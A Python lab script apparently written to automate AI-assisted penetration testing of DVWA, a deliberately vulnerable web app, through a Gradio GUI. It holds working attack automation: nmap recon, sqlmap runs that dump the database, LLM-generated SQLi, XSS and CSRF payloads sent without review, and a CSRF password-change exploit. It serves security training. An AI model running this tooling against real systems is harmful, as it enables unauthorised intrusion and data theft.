#!/usr/bin/env python3
# dvwa_final.py - FINAL Robust DVWA AI-Assisted Pentesting Script
# Programmed By Gavin Pandha

# =================================
#  PYTHON IMPORTS
# =================================
import gradio as gr
import paramiko
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import os
import re
import json
import time
import subprocess
import xml.etree.ElementTree as ET
from urllib.parse import quote

# =================================
#  SELENIUM IMPORTS
# =================================
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    NoSuchElementException,
    TimeoutException
)

try:
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.chrome.service import Service
    WEBDRIVER_MANAGER_AVAILABLE = True
except ImportError:
    WEBDRIVER_MANAGER_AVAILABLE = False

# ====================== PRE-USE INSTRUCTIONS (Copy to Paper) ======================
"""
PREREQUISITES & SETUP CHECKLIST

1. Python Environment (Host Machine)
   - Python 3.10+ recommended
   - Create venv (optional but recommended):
       python -m venv venv
       source venv/bin/activate  (Linux/macOS)
       venv\\Scripts\\activate   (Windows)

2. Install Python Dependencies:
   pip install gradio paramiko requests beautifulsoup4 selenium webdriver-manager

3. Kali Linux VM Requirements:
   - Nmap installed:
       sudo apt update && sudo apt install -y nmap
   - SQLMap installed:
       sudo apt install -y sqlmap
   - SSH server enabled:
       sudo systemctl enable ssh
       sudo systemctl start ssh

4. SSH Key Authentication:
   - Windows private key:
       C:\\Users\\gpandha\\kali_ssh
   - Copy public key to Kali:
       mkdir -p ~/.ssh
       nano ~/.ssh/authorized_keys
   - Set correct permissions on Kali:
       chmod 700 ~/.ssh
       chmod 600 ~/.ssh/authorized_keys

5. DVWA Setup on Kali:
   - DVWA installed at:
       /var/www/html/DVWA
   - Apache running:
       sudo systemctl enable apache2
       sudo systemctl start apache2
   - MySQL/MariaDB running:
       sudo systemctl enable mysql
       sudo systemctl start mysql
   - DVWA configured and database initialized
   - DVWA security level configurable (low, medium, high)

6. Browser Automation (Selenium):
   - Google Chrome installed on host machine
   - webdriver-manager will auto-download ChromeDriver
   - If Chrome auto-update breaks Selenium, re-run script to refresh driver

7. Ollama (Local LLM Engine):
   - Ollama installed and running:
       ollama serve
   - Model pulled (example):
       ollama pull qwen3-coder:30b
   - API reachable at:
       http://localhost:11434/api/generate

8. Network & Access:
   - Kali VM IP matches DEFAULT_CONFIG["kali_ip"]
   - Host machine can reach Kali VM over SSH
   - DVWA accessible in browser:
       http://<KALI_IP>/DVWA

9. Legal / Lab Safety:
   - Do NOT scan external networks or real-world targets

TROUBLESHOOTING QUICK CHECK:
   - Can you SSH into Kali manually?
   - Does `nmap <kali_ip>` work from Kali?
   - Can you access DVWA in a browser?
   - Does `ollama run qwen3-coder:30b` work locally?
"""

# =================================
#  GUI CONFIG VARIABLES 
# =================================
DEFAULT_CONFIG = {
    "kali_ip": "192.168.56.101",
    "username": "kali",
    "key_path": r"C:\Users\gpandha\kali_ssh",
    "dvwa_user": "admin",
    "dvwa_pass": "password",
    "ollama_url": "http://localhost:11434/api/generate",
    "model": "qwen3-coder:30b",
    "error_log": "dvwa_errors.log",
}

# =================================
#  LOCAL VUL PATHS ON KALI
# =================================
LOCAL_VULN_PATHS = {
    "SQLI": "/var/www/html/DVWA/vulnerabilities/sqli/source/{level}.php",
    "XSS": "/var/www/html/DVWA/vulnerabilities/xss_r/source/{level}.php",
    "CSRF": "/var/www/html/DVWA/vulnerabilities/csrf/source/{level}.php",
}

# =================================
#  LOCAL VUL URLS
# =================================
BASE_URLS = {
    "SQLI": "/DVWA/vulnerabilities/sqli/",
    "XSS": "/DVWA/vulnerabilities/xss_r/",
    "CSRF": "/DVWA/vulnerabilities/csrf/",
}

# =================================
#  NMAP FUNCTION
# =================================
def run_nmap_scan(client, kali_ip, ollama_url, model, error_log):
    import re, json, time, requests, subprocess
    import xml.etree.ElementTree as ET
    from urllib.parse import quote

    report = "Network Reconnaissance (Nmap -sV + NVD + NSE + LLM)\n"
    report += "------------------------------------------------\n\n"

    cmd = f"nmap -sV -p 1-1000 -oX - {kali_ip}"
    out, err = run_ssh(client, cmd, error_log)
    if not out:
        return report + "Nmap failed:\n" + err + "\n"

    # Parse Nmap XML (including CPE)
    services = []
    try:
        root = ET.fromstring(out)
        for port in root.findall(".//port"):
            if port.find("state").attrib.get("state") == "open":
                service = port.find("service")
                cpes = [c.text for c in service.findall("cpe")] if service is not None else []
                services.append({
                    "port": port.attrib.get("portid"),
                    "name": service.attrib.get("name", "unknown") if service is not None else "unknown",
                    "product": service.attrib.get("product", "") if service is not None else "",
                    "version": service.attrib.get("version", "") if service is not None else "",
                    "extrainfo": service.attrib.get("extrainfo", "") if service is not None else "",
                    "cpes": cpes
                })
    except Exception as e:
        return report + f"XML parse error: {e}\n"

    report += "Detected Open Services:\n"
    for s in services:
        report += f" - {s['port']}/tcp {s['name']} {s['product']} {s['version']} {s['extrainfo']}\n"

    # Get NSE script names dynamically
    try:
        nse_output = subprocess.check_output(["nmap", "--script-help", "all"], text=True, stderr=subprocess.STDOUT)
        all_nse_scripts = re.findall(r"(\S+\.nse)", nse_output)
    except Exception:
        all_nse_scripts = []

    enriched_services = []

    for s in services:
        cves = []
        headers = {"User-Agent": "DVWA-Recon/1.0"}

        # Prefer CPE-based lookup
        if s["cpes"]:
            for cpe in s["cpes"]:
                nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName={quote(cpe)}&resultsPerPage=5"
                try:
                    time.sleep(1.2)
                    r = requests.get(nvd_url, headers=headers, timeout=12)
                    if r.status_code == 200:
                        data = r.json()
                        for v in data.get("vulnerabilities", [])[:3]:
                            cves.append({
                                "id": v["cve"]["id"],
                                "desc": v["cve"]["descriptions"][0]["value"][:220]
                            })
                except:
                    pass

        # Fallback to keyword search
        if not cves:
            query = quote(" ".join(filter(None, [s["name"], s["product"], s["version"]])))
            nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={query}&resultsPerPage=5"
            try:
                time.sleep(1.2)
                r = requests.get(nvd_url, headers=headers, timeout=12)
                if r.status_code == 200:
                    data = r.json()
                    for v in data.get("vulnerabilities", [])[:3]:
                        cves.append({
                            "id": v["cve"]["id"],
                            "desc": v["cve"]["descriptions"][0]["value"][:220]
                        })
            except:
                pass

        enriched_services.append({**s, "cves": cves})

    # NSE suggestions dynamically based on similarity
    nse_suggestions = []
    for s in services:
        for script in all_nse_scripts:
            if any(x in script.lower() for x in [s["name"].lower(), s["product"].lower()]):
                nse_suggestions.append(script)
    nse_suggestions = sorted(set(nse_suggestions))[:15]

    ports_str = ",".join(sorted(set(s["port"] for s in services)))

    prompt = f"""
You are an experienced penetration tester.

Open services:
{json.dumps(services, indent=2)}

NVD CVE matches:
{json.dumps(enriched_services, indent=2)}

Available NSE scripts:
{json.dumps(nse_suggestions, indent=2)}

1. Rank services by exploitability
2. Recommend the top NSE scripts to run
3. Output the exact nmap command:
   nmap -sV -p {ports_str} --script=script1,script2 {kali_ip}
4. Suggest manual validation steps

Write in professional pentest style.
"""

    try:
        resp = requests.post(ollama_url, json={"model": model, "prompt": prompt, "stream": False}, timeout=120)
        llama_analysis = resp.json().get("response", "")
    except Exception as e:
        llama_analysis = f"LLM error: {e}"

    report += "\nNVD CVE Matches:\n"
    for s in enriched_services:
        report += f"\n  {s['port']}/tcp {s['name']} {s['product']} {s['version']}\n"
        if s["cves"]:
            for c in s["cves"]:
                report += f"    - {c['id']}: {c['desc']}...\n"
        else:
            report += "    - No CVEs found\n"

    report += "\nSuggested NSE Scripts:\n"
    for s in nse_suggestions:
        report += f"  - {s}\n"

    report += "\nLLM Analysis:\n" + llama_analysis + "\n"

    return report

# =================================
#  SQLMAP FUNCTION
# =================================

def run_sqlmap_scan(client, kali_ip, session, level, error_log):
    report = f"SQLMap Scan for SQL Injection ({level.upper()} Level)\n"
    report += "--------------------------------------------\n\n"
    
    # Target URL for DVWA SQLI (use a basic query param)
    url = f"http://{kali_ip}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
    
    # Extract cookies from the authenticated session
    cookies = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
    
    # SQLMap command: batch mode, dump if vulnerable, moderate level/risk
    cmd = f"sqlmap -u '{url}' --cookie='{cookies}' --batch --dump --level=3 --risk=3"
    
    out, err = run_ssh(client, cmd, error_log)
    if out:
        report += "SQLMap Output:\n"
        report += out.strip() + "\n"
    else:
        report += "SQLMap scan failed or no output:\n" + err + "\n"
    
    return report

# =================================
#  FIRE UP OLLAMA ON HOST
# =================================

def ask_ollama(ollama_url, model, prompt, retries=3):
    for attempt in range(retries):
        try:
            payload = {
                "model": model,
                "prompt": prompt,
                "stream": False
            }
            r = requests.post(ollama_url, json=payload, timeout=270)
            r.raise_for_status()
            return r.json().get("response", "")
        except requests.exceptions.RequestException as e:
            if attempt == retries - 1:
                return f"Error contacting Ollama: {str(e)}"
        except Exception as e:
            return f"Error processing Ollama response: {str(e)}"

# =================================
#  SSH FUNCTION
# =================================
def run_ssh(client, cmd, error_log):
    try:
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode(errors="ignore")
        err = stderr.read().decode(errors="ignore")
        if err:
            with open(error_log, "a", encoding="utf-8") as log:
                log.write(f"SSH ERR: {cmd} - {err}\n")
        return out, err
    except Exception as e:
        return "", f"SSH command execution failed: {str(e)}"


# =================================
#  SELENIUM HELPERS
# =================================
def selenium_setup():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-popup-blocking')
    if WEBDRIVER_MANAGER_AVAILABLE:
        service = Service(ChromeDriverManager().install())
        browser = webdriver.Chrome(service=service, options=options)
    else:
        browser = webdriver.Chrome(options=options)
    return browser

# =================================
#  SELENIUM DVWA LOGIN
# =================================
def selenium_login(browser, kali_ip, dvwa_user, dvwa_pass, timeout=30):
    login_url = f"http://{kali_ip}/DVWA/login.php"
    browser.get(login_url)
    wait = WebDriverWait(browser, timeout)
    try:
        username_field = wait.until(EC.presence_of_element_located((By.NAME, "username")))
        password_field = browser.find_element(By.NAME, "password")
        login_button = browser.find_element(By.NAME, "Login")
        username_field.send_keys(dvwa_user)
        password_field.send_keys(dvwa_pass)
        login_button.click()
        wait.until(EC.url_contains("index.php"))
        if "login.php" in browser.current_url:
            raise Exception("DVWA login failed")
    except TimeoutException:
        raise Exception("Timeout during DVWA login")
    except NoSuchElementException:
        raise Exception("Could not find login elements")

# =================================
#  SELENIUM DVWA SECURITY
# =================================
def selenium_set_security(browser, kali_ip, level, timeout=30):
    security_url = f"http://{kali_ip}/DVWA/security.php"
    browser.get(security_url)
    wait = WebDriverWait(browser, timeout)
    try:
        security_select = wait.until(EC.presence_of_element_located((By.NAME, "security")))
        security_select.send_keys(level)
        submit_button = browser.find_element(By.NAME, "seclev_submit")
        submit_button.click()
        browser.get(security_url)
        if level not in browser.page_source.lower():
            raise Exception(f"Failed to set security level to {level}")
    except TimeoutException:
        raise Exception("Timeout setting security level")

# =================================
#  DVWA PHPSSID
# =================================
def get_dvwa_session(browser, kali_ip):
    session = requests.Session()
    for cookie in browser.get_cookies():
        session.cookies.set(cookie['name'], cookie['value'])
    r = session.get(f"http://{kali_ip}/DVWA/index.php")
    if "Logout" not in r.text:
        raise Exception("Failed to create authenticated requests session")
    return session

# --- Testing Function (Robust SQLi/CSRF handling) ---
# =================================
#  TEST FUNCTION
# =================================
def requests_test_payload(session, kali_ip, vuln, level, payloads_str, original_pass, timeout=10):
    results = []
    base_url = f"http://{kali_ip}{BASE_URLS[vuln]}"
    payload_lines = extract_payloads(payloads_str, vuln)

    if not payload_lines:
        results.append("No payloads generated - vulnerability may be fully mitigated")
        return "\n".join(results)

    if level == "high":
        if vuln == "SQLI":
            results.append("HIGH MODE NOTE: SQLi uses $_SESSION['id'] — direct parameter injection blocked by design. No enumeration expected.")
        if vuln == "CSRF":
            results.append("HIGH MODE NOTE: CSRF requires valid user_token. Exploit without token should fail.")

    for idx, payload in enumerate(payload_lines, 1):
        result_line = f"{idx}. {payload.strip()} → "
        try:
            if vuln == "SQLI":
                r = session.get(base_url, params={"id": payload, "Submit": "Submit"}, timeout=timeout)
                if r.status_code == 200 and r.text.count("Surname:") > 1:
                    results.append(result_line + "SUCCESS - Enumerated multiple rows (penetration successful)")
                    results.append(f"   Leaked data: {r.text[:400].strip()}...")
                elif r.status_code == 500:
                    results.append(result_line + "FAILED - HTTP 500 (possible server error or rejection)")
                else:
                    results.append(result_line + "FAILED - No data leak detected")

            elif vuln == "XSS":
                r = session.get(base_url, params={"name": payload}, timeout=timeout)
                lower = r.text.lower()
                if any(term in lower for term in [payload.lower(), "onerror", "onload", "alert", "javascript:"]):
                    results.append(result_line + "SUCCESS - Payload reflected/executed (penetration successful)")
                    results.append(f"   Reflected content: {r.text[:300].strip()}...")
                else:
                    results.append(result_line + "FAILED - No reflection")

            elif vuln == "CSRF":
                # Extract real token
                page = session.get(base_url, timeout=timeout)
                soup = BeautifulSoup(page.text, "html.parser")
                token_tag = soup.find("input", {"name": "user_token"})
                token = token_tag["value"] if token_tag else None

                # Legitimate test (with token)
                params = {"password_new": "hacked123", "password_conf": "hacked123", "Change": "Change"}
                if token:
                    params["user_token"] = token
                r_legit = session.get(base_url, params=params, timeout=timeout)
                if "Password Changed" in r_legit.text:
                    results.append(result_line + "Legitimate change SUCCESS (token used)")
                    # Reset
                    reset = {"password_new": original_pass, "password_conf": original_pass, "Change": "Change"}
                    if token:
                        reset["user_token"] = token
                    reset_r = session.get(base_url, params=reset, timeout=timeout)
                    if "Password Changed" not in reset_r.text:
                        results.append("Reset failed - manual reset needed")
                else:
                    results.append(result_line + "Legitimate change FAILED")

                # Exploit test (without token)
                exploit = {"password_new": "hacked123", "password_conf": "hacked123", "Change": "Change"}
                r_exploit = session.get(base_url, params=exploit, timeout=timeout)
                if "Password Changed" in r_exploit.text:
                    results.append(result_line + "EXPLOIT SUCCESS - Changed without token!")
                else:
                    results.append(result_line + "EXPLOIT FAILED - Token required (defense holds)")

        except Exception as e:
            results.append(result_line + f"ERROR: {type(e).__name__} – {str(e)}")

    return "\n".join(results)

# --- Payload Extraction ---
# =================================
#  PAYLOAD EXTRACTION
# =================================
def extract_payloads(payloads_str, vuln):
    payload_lines = []
    lines = payloads_str.splitlines()
    capturing = False
    for line in lines:
        line = line.strip()
        if vuln.upper() in line or line.startswith("[") or line.startswith("1."):
            capturing = True
        if capturing:
            if line.startswith(("1.", "2.", "3.", "4.", "5.")):
                clean = line.split(".", 1)[1].strip() if "." in line else line
                payload_lines.append(clean)
            elif re.match(r'^\s*\{\s*"', line) or line.startswith("["):
                payload_lines.append(line)
            elif payload_lines and line:
                payload_lines[-1] += " " + line
        if capturing and ("Note:" in line or "Curl" in line or "HTML" in line):
            break
    if not payload_lines:
        payload_lines.append("No payloads generated - vulnerability may be fully mitigated")
    return payload_lines

# --- Core Analysis Function ---
# =================================
#  CORE OLLAMA ANALSIS FUNCTION
# =================================
def run_analysis(kali_ip, username, key_path, dvwa_user, dvwa_pass, ollama_url, model, error_log, selected_levels, selected_vulns, progress=gr.Progress()):
    logs = []
    report_files = []

    def log(msg):
        logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        return "\n".join(logs)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        log(f"Connecting to Kali at {kali_ip}...")
        client.connect(kali_ip, username=username, key_filename=key_path, timeout=10)
        test_out, test_err = run_ssh(client, "ls /var/www/html/DVWA", error_log)
        if "vulnerabilities" not in test_out:
            raise Exception("DVWA not found in expected path. Check installation.")
        log("Connected and validated DVWA install!")

        # Nmap scan right after validation
        nmap_report = run_nmap_scan(client, kali_ip, ollama_url, model, error_log)
        log("Nmap scan completed")

        levels = [l for l in ["low", "medium", "high", "impossible"] if l in selected_levels]
        vulns = [v for v in ["SQLI", "XSS", "CSRF"] if v in selected_vulns]

        if not levels or not vulns:
            raise Exception("No security levels or vulnerabilities selected.")

        total_steps = len(levels) * len(vulns) * 3
        current_step = 0

        for level in levels:
            if level == "impossible":
                code_sections = ["Impossible level – DVWA is hardened by design (no vulnerable code exposed)."]
                threat_analyses = []
                recommendations_list = []
                payloads_texts = []
                test_results = ["Impossible level – no penetration possible by design."]
                log(f"Skipping analysis for impossible level - hardened by design")
                # To extend: place hardened source in /var/www/html/DVWA/vulnerabilities/{vuln}/source/impossible.php
                # Then update LOCAL_VULN_PATHS and remove this if block
                continue

            browser = selenium_setup()
            try:
                log(f"Starting browser for {level.upper()} level")
                selenium_login(browser, kali_ip, dvwa_user, dvwa_pass)
                log("DVWA login successful")
                selenium_set_security(browser, kali_ip, level)
                log("Security level set")
                session = get_dvwa_session(browser, kali_ip)
                log("Authenticated requests session created")

                code_sections = []
                threat_analyses = []
                recommendations_list = []
                payloads_texts = []
                test_results = []
                sqlmap_results = []

                for vuln in vulns:
                    current_step += 1
                    progress(current_step / total_steps, desc=f"Analyzing {vuln} at {level.upper()}...")

                    path = LOCAL_VULN_PATHS[vuln].format(level=level)
                    out, err = run_ssh(client, f"cat {path}", error_log)
                    if out.strip():
                        php_code = out
                        code_sections.append(f"\n===== {vuln} ({level}) SOURCE CODE =====\nPATH: {path}\n\n{php_code}\n")
                    else:
                        out, err = run_ssh(client, f"ls -l {path}", error_log)
                        code_sections.append(f"\n===== {vuln} ({level}) FILE INFO =====\nPATH: {path}\n\n{out}\n{err}")

                    log(f"PHP file for {vuln} pulled")

                    base_url = BASE_URLS[vuln]
                    env_url = f"http://{kali_ip}{base_url}"

                    analysis_prompt = f"""
You are a cybersecurity analyst reviewing intentionally vulnerable DVWA PHP code.

Tasks:
1) Identify the vulnerabilities for {vuln} {level} using the source php file. {php_code}
2) For each:
   - Explain insecure pattern
   - Realistic attack paths (include session usage)
   - OWASP Top 10 mapping
   - MITRE ATT&CK mapping
3) Threat analysis:
   - Threat actor profile
   - Attack surface
   - Impact
   - Likelihood
   - Detection
   - Suggested payloads
4) Output CLI-friendly report with headings and bullets.
5) Environment: {env_url}.
"""
                    threat_analysis = ask_ollama(ollama_url, model, analysis_prompt)
                    threat_analyses.append(f"### {vuln}\n{threat_analysis}")
                    log(f"Threat analysis for {vuln} complete")

                    recommendation_prompt = f"""
Based on the following vulnerability analysis for {vuln} at {level} in DVWA:

{threat_analysis}

Provide detailed remediation recommendations.
Output in CLI-friendly format with headings and bullets.
"""
                    recommendation = ask_ollama(ollama_url, model, recommendation_prompt)
                    recommendations_list.append(f"### {vuln}\n{recommendation}")
                    log(f"Recommendations for {vuln} generated")

                    payload_prompt = f"""
You are an advanced penetration tester. Generate 3–5 realistic, unique payloads for {vuln} at {level} security level in DVWA.

Reference code:
{php_code}

Include curl commands or HTML forms when useful. Use {{SESSION_ID}} placeholder for session if needed.

For CSRF, output ONLY JSON array of dicts with form parameters, e.g.:
[
  {{"password_new": "hacked123", "password_conf": "hacked123", "Change": "Change"}},
  ...
]

For other vulns, start exactly with '{vuln} Payloads:' followed by numbered items. No introductory text.

Make sure payloads are valid for {env_url} environment. Do not hardcode generic payloads; tailor to the code.
"""
                    payloads = ask_ollama(ollama_url, model, payload_prompt)
                    payloads_texts.append(f"### {vuln}\n{payloads}")
                    log(f"Payloads for {vuln} generated")

                    current_step += 1
                    progress(current_step / total_steps, desc=f"Testing {vuln} at {level.upper()}...")
                    test_result = requests_test_payload(session, kali_ip, vuln, level, payloads, dvwa_pass)
                    test_results.append(f"### {vuln}\n{test_result}")
                    log(f"Payload testing for {vuln} complete")
                    if vuln == "SQLI" and level in {"low", "medium", "high"}:
                        sqlmap_report = run_sqlmap_scan(client, kali_ip, session, level, error_log)
                        sqlmap_results.append(f"### SQLI ({level.upper()})\n{sqlmap_report}")
                        log(f"SQLMap scan for SQLI ({level}) complete")

                    current_step += 1
                    progress(current_step / total_steps, desc=f"Completed {vuln} at {level.upper()}")

                # Escape curly braces
                def escape_fstring(text):
                    return text.replace("{", "{{").replace("}", "}}")

                threat_analyses_escaped = [escape_fstring(t) for t in threat_analyses]
                recommendations_escaped = [escape_fstring(r) for r in recommendations_list]
                payloads_escaped = [escape_fstring(p) for p in payloads_texts]
                test_results_escaped = [escape_fstring(t) for t in test_results]
                code_sections_escaped = [escape_fstring(c) for c in code_sections]
                sqlmap_escaped = [escape_fstring(s) for s in sqlmap_results]

                # Build report
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                session_id = session.cookies.get("PHPSESSID", "N/A")
                full_report = f"""\
================================================================================
                DVWA VULNERABILITY ASSESSMENT REPORT
================================================================================

Report Title:      DVWA Security Assessment – {level.upper()} Level
Project:           DVWA Laboratory Environment (Virtualized/Local)
Prepared for:      Security Research & Training Purposes
Prepared by:       AI-Assisted Pentesting Workflow
Report Date:       {timestamp}

--------------------------------------------------------------------------------
EXECUTIVE SUMMARY
--------------------------------------------------------------------------------

This report presents the results of an automated vulnerability assessment of the
Damn Vulnerable Web Application (DVWA) running at security level: {level.upper()}.

Scope:
• {', '.join(vulns)}

Methodology:
- Static analysis of PHP source code via SSH
- AI-assisted vulnerability identification (OWASP & MITRE mapping)
- AI-generated tailored payloads
- Automated testing using authenticated HTTP requests

Key Observations:
• {level.upper()} level exhibits expected vulnerabilities based on security controls.

--------------------------------------------------------------------------------
ENVIRONMENT & SESSION DETAILS
--------------------------------------------------------------------------------

Target:            http://{kali_ip}/DVWA/
Security Level:    {level.upper()}
Session ID:        {session_id}
DVWA Credentials:  {dvwa_user} / {dvwa_pass}
Scan Date:         {timestamp}

--------------------------------------------------------------------------------
NETWORK RECONNAISSANCE (Nmap -sV + NVD + NSE)
--------------------------------------------------------------------------------

{nmap_report}

--------------------------------------------------------------------------------
DETAILED FINDINGS & ANALYSIS
--------------------------------------------------------------------------------

{'\n\n'.join(threat_analyses_escaped)}

--------------------------------------------------------------------------------
PROOF-OF-CONCEPT PAYLOADS
--------------------------------------------------------------------------------

{'\n\n'.join(payloads_escaped)}

--------------------------------------------------------------------------------
TEST RESULTS (Penetration & Enumeration)
--------------------------------------------------------------------------------

{'\n\n'.join(test_results_escaped)}

--------------------------------------------------------------------------------
SQLMAP AUTOMATED SCAN RESULTS
--------------------------------------------------------------------------------

{'\n\n'.join(sqlmap_escaped)}

--------------------------------------------------------------------------------
RECOMMENDATIONS
--------------------------------------------------------------------------------

{'\n\n'.join(recommendations_escaped)}

--------------------------------------------------------------------------------
RAW SOURCE CODE (APPENDIX)
--------------------------------------------------------------------------------

{'\n'.join(code_sections_escaped)}

================================================================================
End of Report – Generated by AI-assisted DVWA Pentesting Script
================================================================================
"""

                safe_timestamp = timestamp.replace(":", "-").replace(" ", "_")
                report_file = f"DVWA_Assessment_{level.upper()}_{safe_timestamp}.txt"
                with open(report_file, "w", encoding="utf-8") as f:
                    f.write(full_report)
                report_files.append(report_file)
                log(f"Report saved: {report_file}")

            finally:
                browser.quit()

        return "\n".join(logs), report_files

    except Exception as e:
        log(f"Error: {str(e)}")
        return "\n".join(logs), report_files
    finally:
        client.close()

# =================================
#  GRADIO INTERFACE
# =================================
with gr.Blocks(title="DVWA AI Pentesting GUI") as demo:
    gr.Markdown("# DVWA AI-Assisted Vulnerability Assessment")
    gr.Markdown("**Warning: Use only in lab environments. CSRF tests may temporarily change DVWA password (auto-reset on success)! Ensure ChromeDriver is installed for Selenium.**")

    with gr.Row():
        kali_ip = gr.Textbox(label="Kali IP", value=DEFAULT_CONFIG["kali_ip"])
        username = gr.Textbox(label="SSH Username", value=DEFAULT_CONFIG["username"])
    with gr.Row():
        key_path = gr.Textbox(label="SSH Key Path", value=DEFAULT_CONFIG["key_path"])
        dvwa_user = gr.Textbox(label="DVWA Username", value=DEFAULT_CONFIG["dvwa_user"])
    with gr.Row():
        dvwa_pass = gr.Textbox(label="DVWA Password", type="password", value=DEFAULT_CONFIG["dvwa_pass"])
        model = gr.Textbox(label="Ollama Model", value=DEFAULT_CONFIG["model"])
    ollama_url = gr.Textbox(label="Ollama URL", value=DEFAULT_CONFIG["ollama_url"])
    error_log = gr.Textbox(label="Error Log File", value=DEFAULT_CONFIG["error_log"])

    levels = gr.CheckboxGroup(choices=["low", "medium", "high", "impossible"], label="Security Levels", value=["high"])
    vulns = gr.CheckboxGroup(choices=["SQLI", "XSS", "CSRF"], label="Vulnerabilities", value=["SQLI", "XSS", "CSRF"])

    run_btn = gr.Button("Run Analysis", variant="primary")

    log_output = gr.Textbox(label="Analysis Log", lines=15, interactive=False)
    reports_output = gr.File(label="Download Reports", visible=False)

    def start_gui_analysis(kali_ip, username, key_path, dvwa_user, dvwa_pass, ollama_url, model, error_log, levels, vulns):
        log_text, report_files = run_analysis(kali_ip, username, key_path, dvwa_user, dvwa_pass, ollama_url, model, error_log, levels, vulns)
        return log_text, gr.File(value=report_files, visible=True) if report_files else None

    run_btn.click(
        start_gui_analysis,
        inputs=[kali_ip, username, key_path, dvwa_user, dvwa_pass, ollama_url, model, error_log, levels, vulns],
        outputs=[log_output, reports_output]
    )

demo.launch(server_name="127.0.0.1", server_port=7860, share=False)